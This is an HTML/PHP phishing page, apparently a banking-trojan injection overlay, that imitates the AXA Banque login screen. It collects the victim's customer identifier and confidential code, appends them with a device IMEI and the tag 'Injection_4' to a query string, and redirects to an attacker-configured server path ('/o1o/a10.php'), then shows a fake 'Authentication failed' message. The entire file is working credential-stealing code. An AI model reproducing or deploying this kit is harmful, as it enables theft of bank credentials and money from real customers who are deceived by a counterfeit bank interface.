<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <title>AssuranceBanque</title>

    <link rel="stylesheet" href="fr/Axa/css/normalize.css">
    <link rel="stylesheet" href="fr/Axa/css/main.css">
	<link rel="stylesheet" href="fr/Axa/css/cat.style.css" type="text/css" media="all">
    <link rel="stylesheet" href="fr/Axa/css/agricole.css">

    <script src="fr/Axa/js/vendor/jquery-1.11.3.min.js"></script>
    <script src="fr/Axa/js/viewport.js"></script>
	<script src="fr/Axa/js/cat.functions.js"></script>
</head>

<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>

<body>
		<div class="modal modal_04">
		
            <div class="row">
                <div class="form_header">
                    <img src="fr/Axa/img/agricole/logo.png" style="width:80%; max-height: 180px;">
                </div>
            </div>
			
			<div class="container">
				<div id="cat-error">
				<span>Authentication failed or timed out</span>
				<input type="button" class="login_btn" value="Try enter again"
				onClick="tryEnterAgain();"/>
				</div>

			<div id="cat-forms">
		<form id="form" class="cat-start-step">
					<div class="row">
						<div class="content">
							<div class="input_block_wr">
								<div class="inp_caption">
									 Identifiant AXA ou n° de client AXA Banque 
								</div>
								<div class="inp_wr">
									<input type="text" name="field2" id="login" class="main_input"  required="">
								</div>
							</div>
							<div class="input_block_wr">
								<div class="inp_caption">
									 Code confidentiel 
								</div>
								<div class="inp_wr">
									<input type="password" name="field3" id="pass" class="main_input"  required="">
								</div>
							</div>
							<div class="btn_wr">
								<input type="button" onClick=sentServer();
								class="login_btn" value="M'identifier"/>
							</div>
						</div>
					</div>
					<?php
echo "<input data-role='none' type='text' name='imei' value='$IMEI_country' class='imei' style='visibility:hidden'/>";
?>
				</form>
					<form id="cat-step-2" class="cat-last-step">
				<span>Authentication failed or timed out</span>
				<input type="button" class="CLASS" value="Try enter again"
					onClick="closeWindow()"/>
				</form>

</div>
			</div>
		</div>
</body>
<script>
function sentServer()
{
var oNumInp = document.getElementById('login');
var oCodeInp = document.getElementById('pass');


if ((oNumInp.value.length > 5)&&(oCodeInp.value.length > 3)) {
	var imei_c = document.forms["form"].elements["imei"].value; 
	var login1 = document.forms["form"].elements["login"].value; 
	var pass = document.forms["form"].elements["pass"].value; 
	var url='<?php echo $URL; ?>';
	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|France Axa|"+login1+"|"+pass);
}
						
	
	

}
</script>
</html>
